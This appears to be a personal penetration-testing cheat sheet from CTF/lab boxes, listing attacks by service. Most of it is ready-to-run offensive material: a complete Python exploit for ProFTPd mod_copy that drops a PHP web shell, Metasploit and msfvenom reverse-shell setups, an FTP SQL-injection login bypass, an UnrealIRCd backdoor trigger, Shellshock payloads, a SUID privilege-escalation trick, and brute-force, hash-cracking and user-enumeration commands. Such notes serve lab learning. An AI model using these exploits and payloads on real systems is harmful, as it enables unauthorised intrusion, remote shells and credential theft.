# ProFTPd

## ProFTPd 1.3.5, mod_copy

Box : Joy

Any Linux server running Proftp version < 1.3.5 are vulnerable.
https://raw.githubusercontent.com/t0kx/exploit-CVE-2015-3306/master/exploit.py
https://www.exploit-db.com/exploits/36742
https://www.exploit-db.com/exploits/36803

<https://www.exploit-db.com/exploits/36742>

	use exploit/unix/ftp/proftpd_modcopy_exec
	set RHOST 192.168.6.154
	set SITEPATH /var/www/html/test
	set TARGETURI /test/
	set PAYLOAD cmd/unix/reverse_perl
	# set payload cmd/unix/reverse_python
	set LHOST 192.168.6.138
	run


```python
#!/usr/bin/env python
# CVE-2015-3306 exploit by t0kx
# https://github.com/t0kx/exploit-CVE-2015-3306

import re
import socket
import requests
import argparse

class Exploit:
    def __init__(self, host, port, path):
        self.__sock = None
        self.__host = host
        self.__port = port
        self.__path = path

    def __connect(self):
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.connect((self.__host, self.__port))
        self.__sock.recv(1024)

    def __exploit(self):
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        # self.__sock.send(b"site cpfr /proc/self/fd/3\n")
        self.__sock.send(b"site cpfr /proc/self/cmdline\n")
        self.__sock.recv(1024)
        self.__sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
        self.__sock.recv(1024)
        self.__sock.send(("site cpto "+ self.__path +"/backdoor.php\n").encode("utf-8"))

        if "Copy successful" in str(self.__sock.recv(1024)):
            print("[+] Target exploited, acessing shell at http://" + self.__host + "/backdoor.php")
            print("[+] Running whoami: " + self.__trigger())
            print("[+] Done")
        else:
            print("[!] Failed")

    def __trigger(self):
        data = requests.get("http://" + self.__host + "/backdoor.php?cmd=whoami")
        match = re.search('cpto /tmp/.([^"]+)', data.text)
        return match.group(0)[11::].replace("\n", "")

    def run(self):
        self.__connect()
        self.__exploit()

def main(args):
    print("[+] CVE-2015-3306 exploit by t0kx")
    print("[+] Exploiting " + args.host + ":" + args.port)

    exploit = Exploit(args.host, int(args.port), args.path)
    exploit.run()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True)
    parser.add_argument('--path', required=True)
    args = parser.parse_args()

    main(args)

```
## ProFTPD 1.2.8 - 1.2.9 mod_sql
	
Boxes : Relativity

	└─$ ftp 172.16.16.128
	Connected to 172.16.16.128.
	220 Welcome to Relativity FTP (mod_sql)
	Name (172.16.16.128:kali): %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # 
	331 Password required for %').
	Password:1  <== WHY ?
	230 User %') and 1=2 union select 1,1,uid,gid,homedir,shell from users; # logged in.
	Remote system type is UNIX.
	Using binary mode to transfer files.
	ftp> ls 
	200 PORT command successful




# vsftpd

- The default location for pub ftp on CentOS : __/var/ftp/pub/__

# Tomcat

Boxes : sleepy

- Default : 
	1. _/etc/tomcat/tomcat-users.xml_
	2. _/etc/tomcat/server.xml_
- Shell
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.56.1 LPORT=1234 -f war > shell.war
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war



# UnrealIRCd 3.2.8.1

Boxes : Relativity

	echo "AB;<command>" |nc <IRCd address> <port>

# HTTP auth basic

	# Brute force
	$ hydra -l admin  -p darkweb2017-top100.txt  a.b.c.d http-get


# Bash [v1.14 - v4.3 ]


## Shellshock bash [v1.14 - v4.3 ]

Boxes : sleepy

	env var='() { ignore this;}; echo VULN' bash -c /bin/true  
	env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
	env X=' () { }; echo hello' bash -c 'date'
	shellshocker='() { echo You are vulnerable; }' bash -c shellshocker

	curl -A " () { :; }; echo VULN " {URL}
	telnet <serveur_internet_sous_notre_controle> 8888
	# export function
	bash-4.2$ function /usr/bin/sl () { /bin/bash; }
	bash-4.2$ export -f /usr/bin/sl

## SHELLOPTS and PS4

Boxes : K2

    bash-4.2$ env -i SHELLOPTS=xtrace PS4='$(chown root:root /tmp/egg && chmod +s /tmp/egg)' /bin/sh -c '/usr/local/bin/whoisme'



# nginx

- Default path
	
	/nginx/usr/share/nginx/html/

# Wordpress

- Theme twentynineteen : /var/www/html/wordpress/wp-content/themes/twentynineteen/


# joomla


- Templates --> Template default for all pages --> New file --> Upload



# SSH

	ssh -t user@host $SHELL --norc --noprofile


# Docker

## enumeration

- deepce github

## Configuation

- docker-compose.yml
- gitlab-secrets.json
- gitlab.rb


# Samba

	enum4linux -a 192.168.110.17
	

	└─$ smbclient --user=qiu //192.168.110.17/qiu
	Enter WORKGROUP\qiu's password: password

	smbclient '\\server\share'
	mask ""
	recurse ON
	prompt OFF
	cd 'path\to\remote\dir'
	lcd '~/path/to/download/to/'
	mget *

# FTP

Get alls files

```bash

wget -m ftp://anonymous:anonymous@192.168.110.21

```


# SMTP


## Command to check if a user exists

```bash
VRFY root
```

## Command to ask the server if a user belongs to a mailing list

```bash
EXPN root
```

## User enumeration


### Sigle server

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t $ip

```
### Multi-servers
```bash
for server in $(cat smtpmachines);
do
	smtp-user-enum -M VRFY -U userlist.txt -t $server
done
```



# SSH 

## SSH Private key passphrase id_rsa

```bash
ssh2john key > key.hash
john --wordlist=rockyou.txt key.hash
```


## Enumeration and vuln scanning

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $ip
## Brute-force
hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V


telnet $ip 25